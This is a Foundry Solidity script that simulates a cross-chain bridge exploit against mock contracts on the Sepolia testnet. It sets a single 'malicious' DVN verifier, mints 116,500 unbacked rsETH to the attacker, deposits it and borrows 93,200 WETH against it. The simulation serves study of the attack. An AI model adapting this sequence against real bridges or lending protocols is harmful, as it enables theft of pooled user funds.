// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/FakeRsETH.sol";
import "../src/MockWETH.sol";
import "../src/MockOFTBridge.sol";
import "../src/MockLending.sol";

contract Simulate is Script {
    function run() external {
        uint256 attackerKey = vm.envOr("ATTACKER_PRIVATE_KEY", vm.envUint("DEPLOYER_PRIVATE_KEY"));
        address attacker = vm.addr(attackerKey);

        // Read deployed addresses
        string memory json = vm.readFile("deployments/sepolia.json");
        address bridgeAddr = vm.parseJsonAddress(json, ".mockOFTBridge");
        address lendingAddr = vm.parseJsonAddress(json, ".mockLending");
        address rsETHAddr = vm.parseJsonAddress(json, ".fakeRsETH");

        MockOFTBridge bridge = MockOFTBridge(bridgeAddr);
        MockLending lending = MockLending(lendingAddr);
        FakeRsETH rsETH = FakeRsETH(rsETHAddr);

        vm.startBroadcast(attackerKey);

        // 1. Set 1-of-1 DVN
        address[] memory dvns = new address[](1);
        dvns[0] = _deriveAddr("malicious-dvn");
        bridge.setDVN(1, dvns);
        console.log("Set 1-of-1 DVN config");

        // 2. Bridge 116.5k rsETH to attacker
        bridge.mint(attacker, 116_500e18);
        console.log("Minted 116,500 rsETH to attacker");

        // 3. Deposit all rsETH
        rsETH.approve(address(lending), 116_500e18);
        lending.deposit(116_500e18);
        console.log("Deposited 116,500 rsETH");

        // 4. Borrow max WETH (80% LTV)
        lending.borrow(93_200e18);
        console.log("Borrowed 93,200 WETH (80% LTV)");

        vm.stopBroadcast();
    }

    function _deriveAddr(string memory name) internal pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(name)))));
    }
}
